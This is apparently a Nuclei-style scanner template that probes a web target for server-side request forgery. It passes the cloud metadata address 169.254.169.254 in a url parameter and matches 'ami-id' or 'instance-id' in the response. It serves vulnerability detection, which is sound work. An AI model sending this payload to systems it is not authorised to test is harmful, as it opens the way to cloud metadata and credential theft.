id: ssrf-probe

info:
  name: SSRF Probe
  author: khushi-nirsang
  severity: high
  description: Possible Server Side Request Forgery

requests:
  - method: GET
    path:
      - "{{BaseURL}}/?url=http://169.254.169.254/latest/meta-data/"
    matchers:
      - type: word
        part: body
        words:
          - "ami-id"
          - "instance-id"
        condition: or